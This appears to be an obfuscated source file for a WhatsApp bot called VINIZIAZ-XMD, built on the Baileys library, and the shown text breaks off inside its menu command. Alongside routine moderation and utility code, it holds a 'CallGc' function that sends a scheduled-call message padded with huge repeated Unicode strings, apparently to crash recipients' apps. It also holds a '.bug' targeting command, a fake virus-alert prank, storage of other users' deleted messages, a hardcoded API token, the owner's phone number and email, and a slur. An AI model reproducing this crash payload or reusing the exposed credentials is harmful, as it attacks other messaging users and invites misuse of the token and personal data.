module.exports = async (_0x1b06ef, _0x525370) => {
  try {
    if (!_0x525370.body) {
      return;
    }
    const _0x1b7b3d = _0x525370.body.toLowerCase();
    if (_0x1b7b3d.includes("owner")) {
      const _0x5887d3 = () => {
        const _0x534797 = new Date();
        return _0x534797.toLocaleTimeString("en-US", {
          'timeZone': "Africa/Nairobi"
        });
      };
      const _0x2352b6 = new Date();
      const _0x44ad64 = "👤 *Information* 👤\n\n📸 *Picture:* [Click here](https://files.catbox.moe/ntcw8m.jpg)\n🎂 *Age:* 22 yrs\n🆔 *Name:* VINIZIAZ\n💑 *Relationship:* Dating\n📞 *Number:* +254759925133\n📍 *Location:* Karen, Nairobi\n✨ *Status:* Handsome 😎\n⏰ *Time:* " + _0x5887d3() + " on " + _0x2352b6.toLocaleString("en-US", {
        'weekday': 'long',
        'timeZone': 'Africa/Nairobi'
      });
      await _0x1b06ef.sendMessage(_0x525370.chat, {
        'image': {
          'url': 'https://files.catbox.moe/ntcw8m.jpg'
        },
        'caption': _0x44ad64
      });
    }
  } catch (_0xa872aa) {
    console.error("Error in sending details:", _0xa872aa);
    _0x525370.reply("⚠️ Failed to send details.");
  }
};
async function getGroupProfilePic(_0x4af0f3, _0x43650a) {
  try {
    let _0x129968 = await _0x4af0f3.profilePictureUrl(_0x43650a, 'image');
    return _0x129968 || "https://files.catbox.moe/ntcw8m.jpg";
  } catch (_0x237a16) {
    console.error("Error fetching group profile picture:", _0x237a16);
    return "https://files.catbox.moe/ntcw8m.jpg";
  }
}
async function CallGc(_0x2d83b0) {
  await sam.relayMessage(_0x2d83b0, {
    'viewOnceMessage': {
      'message': {
        'scheduledCallCreationMessage': {
          'callType': "VIDEO",
          'scheduledTimestampMs': Date.now() + 0x260d,
          'title': " Tama Crash Calls " + "𑲭𑲭".repeat(0x186a0) + 'ꦾ'.repeat(0xc350),
          'inviteCode': "youtube.com/@tamainfinity"
        }
      }
    }
  }, {});
}
const axios = require("axios");
async function generateTempEmail() {
  try {
    const _0x54d352 = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox");
    if (_0x54d352.data.length > 0x0) {
      return _0x54d352.data[0x0];
    }
    throw new Error("Email generation failed.");
  } catch (_0x1fd0a2) {
    console.error("Error generating email:", _0x1fd0a2);
    return null;
  }
}
async function checkEmailInbox(_0x3b5803) {
  if (!_0x3b5803) {
    return [];
  }
  const [_0x2134c5, _0x8a270d] = _0x3b5803.split('@');
  try {
    const _0x4260c9 = await axios.get("https://www.1secmail.com/api/v1/?action=getMessages&login=" + _0x2134c5 + "&domain=" + _0x8a270d);
    return _0x4260c9.data;
  } catch (_0x8b8fed) {
    console.error("Error checking inbox:", _0x8b8fed);
    return [];
  }
}
const sendFakeVirusWarning = async (_0x3df38e, _0x502eb1) => {
  try {
    const _0x399824 = ["⚠️ *WARNING! CRITICAL SECURITY ALERT!* ⚠️", "🚨 *Your device has been compromised!* 🚨", "🦠 *Virus Detected: Trojan.MpesaStealer.001*", "📛 *Unauthorized access detected!*", "📡 *Scanning system for potential threats...*", "⏳ *Analyzing device security...*", "📝 *Suspicious activity found in your WhatsApp data!*", "🛑 *Warning! Banking details may be exposed!*", "📂 *Malware is attempting to access your phone storage!*", "📤 *Uploading your contacts and messages to the dark web...*", "🔄 *Deleting personal files...*", "💀 *System error: Critical process terminated!*", "⚡ *Bootloader corrupted. Restarting device...*", "🛠️ *Repairing system files...*", "🧹 *Removing detected threats...*", "✅ *Virus successfully removed!*", "😜 *Haha! You’ve been pranked! No virus detected!*"];
    for (const _0x8b4f23 of _0x399824) {
      await _0x3df38e.sendMessage(_0x502eb1.chat, {
        'text': _0x8b4f23
      });
      await new Promise(_0x4f1ae9 => setTimeout(_0x4f1ae9, 0xbb8));
    }
  } catch (_0x24b476) {
    console.error("Error in sendFakeVirusWarning:", _0x24b476);
    _0x502eb1.reply("⚠️ An error occurred while sending the virus warning.");
  }
};
const {
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType
} = require("@whiskeysockets/baileys");
const fs = require('fs');
const path = require('path');
const util = require("util");
global.axios = require('axios')["default"];
const chalk = require("chalk");
const speed = require("performance-now");
const Genius = require("genius-lyrics");
const yts = require('yt-search');
const {
  DateTime
} = require('luxon');
const uploadtoimgur = require("./lib/imgur");
const advice = require("badadvice");
const {
  c,
  cpp,
  node,
  python,
  java
} = require("compile-run");
const acrcloud = require("acrcloud");
const ytdl = require('ytdl-core');
const Client = new Genius.Client("TUoAEhL79JJyU-MpOsBDkFhJFWFH28nv6dgVgPA-9R1YRwLNP_zicdX2omG2qKE8gYLJat5F5VSBNLfdnlpfJg");
const {
  TelegraPh,
  UploadFileUgu,
  webp2mp4File,
  floNime
} = require("./lib/viniziazupload");
const {
  Configuration,
  OpenAI
} = require("openai");
const {
  menu,
  autoread,
  mode,
  antidel,
  antitag,
  appname,
  herokuapi,
  gptdm,
  botname,
  antibot,
  prefix,
  author,
  packname,
  mycode,
  admin,
  botAdmin,
  dev,
  group,
  bad,
  DevViniziaz,
  NotOwner,
  antilink,
  antilinkall,
  wapresence,
  badwordkick
} = require('./set.js');
const {
  smsg,
  runtime,
  fetchUrl,
  isUrl,
  processTime,
  formatp,
  tanggal,
  formatDate,
  getTime,
  sleep,
  generateProfilePicture,
  clockString,
  fetchJson,
  getBuffer,
  jsonformat,
  format,
  parseMention,
  getRandom
} = require('./lib/viniziazfunc');
const {
  exec,
  spawn,
  execSync
} = require("child_process");
module.exports = viniziaz = async (_0x398b1a, _0xca7ad5, _0x42e075, _0x2be26b) => {
  try {
    var _0x2e7fc5 = _0xca7ad5.mtype === "conversation" ? _0xca7ad5.message.conversation : _0xca7ad5.mtype == "imageMessage" ? _0xca7ad5.message.imageMessage.caption : _0xca7ad5.mtype == 'videoMessage' ? _0xca7ad5.message.videoMessage.caption : _0xca7ad5.mtype == "extendedTextMessage" ? _0xca7ad5.message.extendedTextMessage.text : _0xca7ad5.mtype == "buttonsResponseMessage" ? _0xca7ad5.message.buttonsResponseMessage.selectedButtonId : _0xca7ad5.mtype == "listResponseMessage" ? _0xca7ad5.message.listResponseMessage.singleSelectReply.selectedRowId : _0xca7ad5.mtype == "templateButtonReplyMessage" ? _0xca7ad5.message.templateButtonReplyMessage.selectedId : _0xca7ad5.mtype === "messageContextInfo" ? _0xca7ad5.message.buttonsResponseMessage?.["selectedButtonId"] || _0xca7ad5.message.listResponseMessage?.["singleSelectReply"]["selectedRowId"] || _0xca7ad5.text : '';
    var _0x10ef13 = typeof _0xca7ad5.text == "string" ? _0xca7ad5.text : '';
    var _0x4db425 = _0xca7ad5.message.extendedTextMessage?.["contextInfo"]?.["quotedMessage"];
    const _0x51a63d = require("heroku-client");
    const _0x3418f9 = _0x2e7fc5.replace(prefix, '').trim().split(/ +/).shift().toLowerCase();
    const _0x4dd883 = _0x2e7fc5.trim().split(/ +/).slice(0x1);
    const _0x466e42 = _0xca7ad5.pushName || "No Name";
    const _0x2ba528 = await _0x398b1a.decodeJid(_0x398b1a.user.id);
    const _0x30dc6d = !!(_0xca7ad5.sender == _0x2ba528);
    let _0x32c5b4 = q = _0x4dd883.join(" ");
    _0xca7ad5.isBaileys = _0xca7ad5.id.startsWith('BAE5') && _0xca7ad5.id.length === 0x10;
    const _0x24b6cb = _0xca7ad5.chat;
    const _0x1d37a1 = _0xca7ad5.reply;
    const _0x315e97 = _0xca7ad5.sender;
    const _0x5e9a80 = _0x42e075.messages[0x0];
    const _0x2c466c = _0x3e9049 => {
      let _0x19cc5a = [];
      for (let _0x4f3683 of _0x3e9049) {
        if (_0x4f3683.admin === "superadmin") {
          _0x19cc5a.push(_0x4f3683.id);
        } else if (_0x4f3683.admin === "admin") {
          _0x19cc5a.push(_0x4f3683.id);
        } else {
          '';
        }
      }
      return _0x19cc5a || [];
    };
    const _0x2a5060 = _0xca7ad5.quoted || _0xca7ad5;
    const _0x38810c = _0x2a5060.mtype == 'buttonsMessage' ? _0x2a5060[Object.keys(_0x2a5060)[0x1]] : _0x2a5060.mtype == 'templateMessage' ? _0x2a5060.hydratedTemplate[Object.keys(_0x2a5060.hydratedTemplate)[0x1]] : _0x2a5060.mtype == "product" ? _0x2a5060[Object.keys(_0x2a5060)[0x0]] : _0xca7ad5.quoted ? _0xca7ad5.quoted : _0xca7ad5;
    const _0x372f6b = (_0x38810c.msg || _0x38810c).mimetype || '';
    const _0x459ea4 = _0x38810c.msg || _0x38810c;
    const _0x1d4942 = _0x2e7fc5.startsWith(prefix);
    const _0x3f1e4d = bad.split(',');
    const _0x11f3a8 = DevViniziaz.map(_0x41d1cc => _0x41d1cc.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0xca7ad5.sender);
    const _0x33cc44 = _0xca7ad5.isGroup ? await _0x398b1a.groupMetadata(_0xca7ad5.chat)["catch"](_0x4382fe => {}) : '';
    const _0x225284 = _0xca7ad5.isGroup && _0x33cc44 ? await _0x33cc44.subject : '';
    const _0x35f297 = _0xca7ad5.isGroup && _0x33cc44 ? await _0x33cc44.participants : '';
    const _0x2006eb = _0xca7ad5.isGroup ? await _0x2c466c(_0x35f297) : '';
    const _0x59fea5 = _0xca7ad5.isGroup ? _0x2006eb.includes(_0x2ba528) : false;
    const _0x396ea3 = _0xca7ad5.isGroup ? _0x2006eb.includes(_0xca7ad5.sender) : false;
    const _0xa781d4 = "254759925133".split(',');
    const _0x253f53 = new Date();
    const _0x411fc7 = speed();
    const _0x1df034 = speed() - _0x411fc7;
    if (!fs.existsSync("message_data")) {
      fs.mkdirSync("message_data");
    }
    function _0x2509aa(_0x2f3dbf, _0x4f265e) {
      const _0x19dd2a = path.join("message_data", _0x2f3dbf, _0x4f265e + ".json");
      try {
        const _0x25e1ab = fs.readFileSync(_0x19dd2a, "utf8");
        return JSON.parse(_0x25e1ab) || [];
      } catch (_0x5106a6) {
        return [];
      }
    }
    function _0x2ee61a(_0x7e6587, _0x22c5d8, _0x561082) {
      const _0x597818 = path.join("message_data", _0x7e6587);
      if (!fs.existsSync(_0x597818)) {
        fs.mkdirSync(_0x597818, {
          'recursive': true
        });
      }
      const _0x2429ea = path.join(_0x597818, _0x22c5d8 + ".json");
      try {
        fs.writeFileSync(_0x2429ea, JSON.stringify(_0x561082, null, 0x2));
      } catch (_0x1fc152) {
        console.error("Error saving chat data:", _0x1fc152);
      }
    }
    function _0xd0db3e(_0x5480c3) {
      const _0x3e5357 = _0x5480c3.key.remoteJid;
      const _0xb20095 = _0x5480c3.key.id;
      const _0x1105ad = _0x2509aa(_0x3e5357, _0xb20095);
      _0x1105ad.push(_0x5480c3);
      _0x2ee61a(_0x3e5357, _0xb20095, _0x1105ad);
    }
    async function _0x1ea2f5(_0x3e190e, _0x85f180) {
      const _0x2cb760 = _0x85f180.key.remoteJid;
      const _0x7be69b = _0x85f180.message.protocolMessage.key.id;
      const _0xdb071 = _0x2509aa(_0x2cb760, _0x7be69b);
      const _0x3c90eb = _0xdb071[0x0];
      if (_0x3c90eb) {
        const _0x10f879 = _0x85f180.participant || _0x85f180.key.participant || _0x85f180.key.remoteJid;
        const _0x41d72d = _0x3c90eb.key.participant || _0x3c90eb.key.remoteJid;
        const _0x5bb257 = '@' + _0x10f879.split('@')[0x0];
        if (_0x10f879.includes(_0x3e190e.user.id) || _0x41d72d.includes(_0x3e190e.user.id)) {
          return;
        }
        let _0x51fb13 = "░𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗔𝗡𝗧𝗜𝗗𝗘𝗟𝗘𝗧𝗘 𝗥𝗘𝗣𝗢𝗥𝗧░\n\n" + (" 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗯𝘆: " + _0x5bb257 + "\n\n");
        if (_0x3c90eb.message?.['conversation']) {
          const _0x329d37 = _0x3c90eb.message.conversation;
          _0x51fb13 += " 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝘀𝘀𝗮𝗴𝗲: " + _0x329d37;
          await _0x3e190e.sendMessage(_0x3e190e.user.id, {
            'text': _0x51fb13
          }, {
            'quoted': _0xca7ad5
          });
        } else {
          if (_0x3c90eb.message?.["extendedTextMessage"]) {
            const _0x129b7d = _0x3c90eb.message.extendedTextMessage.text;
            _0x51fb13 += " 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗖𝗼𝗻𝘁𝗲𝗻𝘁: " + _0x129b7d;
            await _0x3e190e.sendMessage(_0x3e190e.user.id, {
              'text': _0x51fb13
            }, {
              'quoted': _0xca7ad5
            });
          }
        }
      }
    }
    async function _0x3e3693(_0x299c4b, _0x4cd11e, _0x5c2064) {
      try {
        if (!_0x5c2064 || _0x5c2064.trim() === '') {
          return _0x4cd11e.reply("❌ 𝚙𝚛𝚘𝚟𝚒𝚍𝚎 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚘 𝚏𝚘𝚛𝚠𝚊𝚛𝚍 𝚝𝚘 𝚘𝚞𝚛 𝚌𝚞𝚜𝚝𝚘𝚖𝚎𝚛𝚌𝚊𝚛𝚎(𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭).");
        }
        await _0x299c4b.sendMessage('254759925133@s.whatsapp.net', {
          'text': _0x5c2064
        });
        _0x4cd11e.reply("✅ Your message has been forwarded to Customer Care\n\n Wait some few minutes as VINIZIAZ will respond as soon as possible.");
      } catch (_0x432819) {
        console.error("Error forwarding to Customer Care:", _0x432819);
        _0x4cd11e.reply("⚠️ An error occurred while forwarding your message.");
      }
    }
    async function _0x814854(_0x2bc232, _0x1c3aea, _0x45be0d) {
      try {
        let _0x131191 = _0x45be0d.split(" ");
        if (_0x131191.length < 0x2) {
          return _0x1c3aea.reply("❌ Please provide a target number and a message. Example: `.bug 254712344678 This is a test message.`");
        }
        let _0x1413f9 = _0x131191.shift().trim();
        let _0x2ced7a = _0x131191.join(" ");
        const _0x1a5280 = _0x1413f9 + '@s.whatsapp.net';
        console.log("Bug command target: " + _0x1a5280);
        console.log("Bug command message: " + _0x2ced7a);
        await _0x2bc232.sendMessage(_0x1a5280, {
          'text': _0x2ced7a
        });
        _0x1c3aea.reply("✅ Bug command executed successfully and message forwarded to the target number.");
      } catch (_0x471e3e) {
        console.error("Error in bugTargetOtherNumber:", _0x471e3e);
        _0x1c3aea.reply("⚠️ An error occurred while executing the bug command.");
      }
    }
    let _0x298f44 = _0x10ef13.length > 0x1e ? q.substring(0x0, 0x1e) + "..." : _0x10ef13;
    const _0xa66362 = _0x5e9a80.key.remoteJid;
    if (wapresence === "online") {
      _0x398b1a.sendPresenceUpdate("available", _0xa66362);
    } else {
      if (wapresence === 'typing') {
        _0x398b1a.sendPresenceUpdate("composing", _0xa66362);
      } else if (wapresence === "recording") {
        _0x398b1a.sendPresenceUpdate("recording", _0xa66362);
      } else {
        _0x398b1a.sendPresenceUpdate('unavailable', _0xa66362);
      }
    }
    if (_0x1d4942 && mode === "PRIVATE" && !_0x30dc6d && !_0x11f3a8 && _0xca7ad5.sender !== dev) {
      return;
    }
    if (autoread === "TRUE" && !_0xca7ad5.isGroup) {
      _0x398b1a.readMessages([_0xca7ad5.key]);
    }
    if (_0x30dc6d && _0x5e9a80.key.id.startsWith("BAE5") && _0x5e9a80.key.id.length === 0x10 && !_0xca7ad5.isGroup) {
      return;
    }
    if (antidel === "TRUE") {
      if (_0x5e9a80.message?.["protocolMessage"]?.["key"]) {
        await _0x1ea2f5(_0x398b1a, _0x5e9a80);
      } else {
        _0xd0db3e(_0x5e9a80);
      }
    }
    _0x398b1a.sendContact = async (_0x3e9691, _0x42a1fc, _0x37cff2 = '', _0x38a759 = {}) => {
      let _0x41572d = [];
      for (let _0x2e165f of _0x42a1fc) {
        _0x41572d.push({
          'displayName': "VINIZIAZ DEV",
          'vcard': "BEGIN:VCARD\nVERSION:3.0\nN: RAVINIZIAZ DEV\nFN:VINIZIAZ DEV\nitem1.TEL;waid=" + _0x2e165f + ':' + _0x2e165f + "\nitem1.X-ABLabel:Number\nitem2.EMAIL;type=INTERNET:dicksonnicky50@gmail.com\nitem2.X-ABLabel:Email\nitem3.URL:https://instagram.com/nick_hunter9\nitem3.X-ABLabel:Instagram\nitem4.ADR:;;Kenya;;;;\nitem4.X-ABLabel:Region\nEND:VCARD"
        });
      }
      _0x398b1a.sendMessage(_0x3e9691, {
        'contacts': {
          'displayName': "VINIZIAZ DEV",
          'contacts': _0x41572d
        },
        ..._0x38a759
      }, {
        'quoted': _0x37cff2
      });
    };
    if (antibot === "TRUE" && _0x5e9a80.key.id.startsWith("BAE5") && _0xca7ad5.isGroup && !_0x396ea3 && _0x59fea5 && _0x5e9a80.key.id.length === 16) {
      kidts = _0xca7ad5.sender;
      _0x398b1a.sendMessage(_0xca7ad5.chat, {
        'text': "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 antibot:\n\n@" + kidts.split('@')[0] + " has been identified as a bot. Removed by RAVEN to prevent unnecessary spam!",
        'contextInfo': {
          'mentionedJid': [kidts]
        }
      }, {
        'quoted': _0xca7ad5
      });
      await _0x398b1a.groupParticipantsUpdate(_0xca7ad5.chat, [kidts], "remove");
    }
    if (_0x10ef13.startsWith('>')) {
      if (!_0x11f3a8) {
        return _0x1d37a1("Only owner can evaluate bailey codes");
      }
      try {
        let _0x41c084 = await eval(_0x10ef13.slice(0x2));
        if (typeof _0x41c084 !== "string") {
          _0x41c084 = require("util").inspect(_0x41c084);
        }
        await _0x1d37a1(_0x41c084);
      } catch (_0x12117d) {
        await _0x1d37a1(String(_0x12117d));
      }
    }
    async function _0x1501d9() {}
    if (gptdm === "TRUE" && _0xca7ad5.chat.endsWith("@s.whatsapp.net")) {
      let _0x33efb5 = await fetchJson("https://bk9.fun/ai/llama?q=" + _0x32c5b4);
      if (!_0x33efb5.BK9) {
        return _0x1d37a1("An error occurred while fetching the AI chatbot response. Please try again later.");
      } else {
        _0x1d37a1(_0x33efb5.BK9);
      }
    }
    if (antitag === "TRUE" && !_0x11f3a8 && _0x59fea5 && !_0x396ea3 && _0xca7ad5.mentionedJid && _0xca7ad5.mentionedJid.length > 0xa) {
      if (_0x30dc6d) {
        return;
      }
      const _0x51f8a9 = _0xca7ad5.sender;
      await _0x398b1a.sendMessage(_0xca7ad5.chat, {
        'text': '@' + _0x51f8a9.split('@')[0x0] + ", Antitag is Active🔨",
        'contextInfo': {
          'mentionedJid': [_0x51f8a9]
        }
      }, {
        'quoted': _0xca7ad5
      });
      await _0x398b1a.sendMessage(_0xca7ad5.chat, {
        'delete': {
          'remoteJid': _0xca7ad5.chat,
          'fromMe': false,
          'id': _0xca7ad5.key.id,
          'participant': _0x51f8a9
        }
      });
      await _0x398b1a.groupParticipantsUpdate(_0xca7ad5.chat, [_0x51f8a9], "remove");
    }
    async function _0x52b900() {
      var _0x36fc6e = ['𝗩', "𝗩𝗜", '𝗩𝗜𝗡', "𝗩𝗜𝗡𝗜𝗭", "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭", '𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-', '𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫', "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠", "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗", "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗦", "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗦𝗣", "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗦𝗣𝗘", "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘", "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗", "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧", "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘", "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦", "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧", "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖", "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢", "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠", "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠𝗣", "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠𝗣𝗟", "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠𝗣𝗟𝗘", "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠𝗣𝗟𝗘𝗧", "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘", "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗"];
      let {
        key: _0x1c75a9
      } = await _0x398b1a.sendMessage(_0x24b6cb, {
        'text': '𝐏𝐢𝐧𝐠𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐧𝐠'
      });
      for (let _0x52b006 = 0x0; _0x52b006 < _0x36fc6e.length; _0x52b006++) {
        await _0x398b1a.sendMessage(_0x24b6cb, {
          'text': _0x36fc6e[_0x52b006],
          'edit': _0x1c75a9
        });
      }
    }
    const _0x3627b9 = () => {
      const _0x45bc27 = DateTime.now().setZone("Africa/Nairobi").hour;
      if (_0x45bc27 >= 0x5 && _0x45bc27 < 0xc) {
        return "𝗚𝗼𝗼𝗱 𝗠𝗼𝗿𝗻𝗶𝗻𝗴 🌅";
      } else {
        if (_0x45bc27 >= 0xc && _0x45bc27 < 0x10) {
          return "𝗚𝗼𝗼𝗱 𝗔𝗳𝘁𝗲𝗿𝗻𝗼𝗼𝗻 ☀️";
        } else {
          return _0x45bc27 >= 0x10 && _0x45bc27 < 0x14 ? "𝗚𝗼𝗼𝗱 𝗘𝘃𝗲𝗻𝗶𝗻𝗴 🌇" : "𝗚𝗼𝗼𝗱 𝗡𝗶𝗴𝗵𝘁 😴";
        }
      }
    };
    if (badwordkick === 'TRUE' && _0x59fea5 && !_0x396ea3 && _0x2e7fc5 && new RegExp("\\b" + _0x3f1e4d.join("\\b|\\b") + "\\b").test(_0x2e7fc5.toLowerCase())) {
      _0x398b1a.groupParticipantsUpdate(_0x24b6cb, [_0x315e97], 'remove');
      _0x1d37a1("Hey niggah.\n\nMy owner hates usage of bad words in my presence!");
    }
    if (antilink === "TRUE" && _0x2e7fc5.includes('chat.whatsapp.com') && !_0x11f3a8 && _0x59fea5 && !_0x396ea3 && _0xca7ad5.isGroup) {
      kid = _0xca7ad5.sender;
      _0x398b1a.sendMessage(_0xca7ad5.chat, {
        'delete': {
          'remoteJid': _0xca7ad5.chat,
          'fromMe': false,
          'id': _0xca7ad5.key.id,
          'participant': kid
        }
      }).then(() => _0x398b1a.groupParticipantsUpdate(_0xca7ad5.chat, [kid], "remove"));
      _0x398b1a.sendMessage(_0xca7ad5.chat, {
        'text': "𝑯𝒆𝒚 𝒎𝒐𝒕𝒉𝒆𝒓𝒇*𝒄𝒌𝒆𝒓 @" + kid.split('@')[0x0] + "👋\n\n𝒔𝒆𝒏𝒅𝒊𝒏𝒈 𝒍𝒊𝒏𝒌𝒔 𝒊𝒔 𝒑𝒓𝒐𝒉𝒊𝒃𝒊𝒕𝒆𝒅 𝒊𝒏 𝒕𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒃𝒚 𝑴𝒁𝑨𝒁𝑰-𝑿𝑴𝑫!",
        'contextInfo': {
          'mentionedJid': [kid]
        }
      }, {
        'quoted': _0xca7ad5
      });
    }
    if (antilinkall === "TRUE" && _0x2e7fc5.includes("https://") && !_0x11f3a8 && _0x59fea5 && !_0x396ea3 && _0xca7ad5.isGroup) {
      ki = _0xca7ad5.sender;
      _0x398b1a.sendMessage(_0xca7ad5.chat, {
        'delete': {
          'remoteJid': _0xca7ad5.chat,
          'fromMe': false,
          'id': _0xca7ad5.key.id,
          'participant': ki
        }
      }).then(() => _0x398b1a.groupParticipantsUpdate(_0xca7ad5.chat, [ki], "remove"));
      _0x398b1a.sendMessage(_0xca7ad5.chat, {
        'text': "𝑯𝒆𝒚 𝑴𝒐𝒕𝒉𝒆𝒓𝒇*𝒄𝒌𝒆𝒓 @" + ki.split('@')[0x0] + "👋\n\n𝑺𝒆𝒏𝒅𝒊𝒏𝒈 𝒍𝒊𝒏𝒌𝒔 𝒊𝒔 𝒑𝒓𝒐𝒉𝒊𝒃𝒊𝒕𝒆𝒅 𝒊𝒏 𝒕𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒃𝒚 𝑴𝒁𝑨𝒁𝑰-𝑿𝑴𝑫 !",
        'contextInfo': {
          'mentionedJid': [ki]
        }
      }, {
        'quoted': _0xca7ad5
      });
    }
    if (_0x1d4942 && !_0xca7ad5.isGroup) {
      console.log(chalk.black(chalk.bgWhite("[ 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 ]")), !_0x2b28(0x55a) ? chalk.green(_0x298f44) : chalk.keyword("turquoise")(_0x298f44), chalk.magenta('From'), chalk.green(_0x466e42), chalk.yellow("[ " + _0xca7ad5.sender.replace("@s.whatsapp.net", '') + " ]"));
    } else if (_0x1d4942 && _0xca7ad5.isGroup) {
      console.log(chalk.black(chalk.bgWhite("[ LOGS ]")), chalk.keyword('turquoise')(_0x298f44), chalk.magenta("From"), chalk.green(_0x466e42), chalk.yellow("[ " + _0xca7ad5.sender.replace("@s.whatsapp.net", '') + " ]"), chalk.blueBright('IN'), chalk.green(_0x225284));
    }
    if (_0x1d4942) {
      switch (_0x3418f9) {
        case "viniziaz":
        case "menu":
          await _0x1501d9();
          let _0x515934 = "𝗛𝗲𝘆 " + _0xca7ad5.pushName + "😁, " + _0x3627b9() + "\n\n𝐓𝐡𝐢𝐬 𝐢𝐬 𝐕𝐈𝐍𝐈𝐙𝐈𝐀𝐙-𝐗𝐌𝐃, 𝐜𝐫𝐞𝐚𝐭𝐞𝐝 𝐛𝐲 𝐌𝐳𝐚𝐳𝐢\n\n╭═════〘 𝐕𝐈𝐍𝐈𝐙𝐈𝐀𝐙-𝐗𝐌𝐃 〙═════╮\n┃✫╭═─────────────────═╮\n┃✬│ 𝗨𝘀𝗲𝗿 : " + _0xca7ad5.pushName + "\n┃✬│ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝙼𝚉𝙰𝚉𝙸\n┃✫│ 𝗣𝗿𝗲𝗳𝗶𝘅 : " + prefix + "\n┃✫│ 𝗠𝗼𝗱𝗲 : " + mode + "\n┃✯│ 𝗦𝗽𝗲𝗲𝗱 :   " + _0x1df034.toFixed(0x4) + " 𝗠𝘀\n┃✬│ 𝗧𝗶𝗺𝗲 : " + DateTime.now().setZone("Africa/Nairobi").toLocaleString(DateTime.TIME_SIMPLE) + " on " + _0x253f53.toLocaleString('en-US', {
            'weekday': "long",
            'timeZone': "Africa/Nairobi"
